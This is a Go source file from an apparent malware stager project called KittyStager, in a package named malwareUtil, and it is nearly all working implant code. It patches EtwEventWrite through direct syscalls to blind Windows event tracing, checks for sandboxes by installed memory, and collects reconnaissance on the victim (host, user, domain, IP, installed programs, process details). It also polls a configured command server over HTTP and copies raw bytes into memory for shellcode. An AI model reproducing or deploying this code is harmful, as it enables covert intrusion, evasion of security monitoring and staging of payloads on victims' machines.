package malwareUtil

import (
	"KittyStager/cmd/util"
	"encoding/json"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	_ "github.com/fourcorelabs/wintoken"
	"golang.org/x/sys/windows"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"time"
	"unsafe"
)

var (
	fntdll  = windows.NewLazyDLL("ntdll.dll")
	fucketw = fntdll.NewProc("EtwEventWrite")
	k32     = windows.NewLazyDLL("kernel32.dll")
)

// https://github.com/timwhitez/Doge-Assembly/blob/main/loader/etw.go
// write arbitrary ret opcodes into the ETW event writing function (EtwEventWrite) to bypass ETW

func EtwHell(hProcess uintptr) {
	var oldProtect uint32
	//c21400
	var patch = []byte{0xc2, 0x14, 0x00}
	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
	write, _ := bp.GetSysID("NtWriteVirtualMemory")
	_, err := bananaphone.Syscall(protect, fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return
	}
	_, err = bananaphone.Syscall(write, hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	if err != nil {
		return
	}
	_, err = bananaphone.Syscall(protect, fucketw.Addr(), 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return
	}
}

// VmCheck checks if the process is running in a VM and returns true
func VmCheck() bool {
	var proc = k32.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	_, _, err := proc.Call(uintptr(unsafe.Pointer(&mem)))
	if err != nil {
		return false
	}
	// if ram is less than 1GB, return false
	return mem < 1000000
}

// https://github.dev/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func Memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

// Recon does some basic recon on the target
func Recon() []byte {
	iniCheck := util.NewInitialChecks()
	// get machine name
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	iniCheck.SetHostname(hostname)
	//get username
	iniCheck.SetUsername(os.Getenv("USERNAME"))
	//get domain
	iniCheck.SetDomain(os.Getenv("USERDOMAIN"))
	//get local ip
	iniCheck.Ip = getLocalIP()
	//get kittenName
	iniCheck.SetKittenName(generateName())
	//get Programe Files
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.SetDir(append(iniCheck.Dir, file.Name()))
	}
	dir86, _ := os.ReadDir("C:\\Program Files (x86)")
	for _, file := range dir86 {
		iniCheck.SetDir(append(iniCheck.Dir, file.Name()))
	}
	//process
	//pid
	iniCheck.SetPid(os.Getpid())
	//process name
	iniCheck.SetPName(os.Args[0])
	//current path
	currentPath, _ := os.Getwd()
	iniCheck.SetPath(currentPath)
	j, _ := json.Marshal(iniCheck)
	return j
}

// https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
// This does not open a connection
func getLocalIP() string {
	conn, err := net.Dial("udp", "100.100.100.100:3480")
	if err != nil {
		return ""
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr).IP.String()
	return localAddr
}

func generateName() string {
	letters := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, 4)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	return string(b)
}

func Request(cookie string, conf []string) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("GET", conf[0], nil)
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", conf[1])
	if cookie != "" {
		req.Header.Add("Cookie", cookie)
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

func Sleep(t int) {
	time.Sleep(time.Duration(t) * time.Second)
}
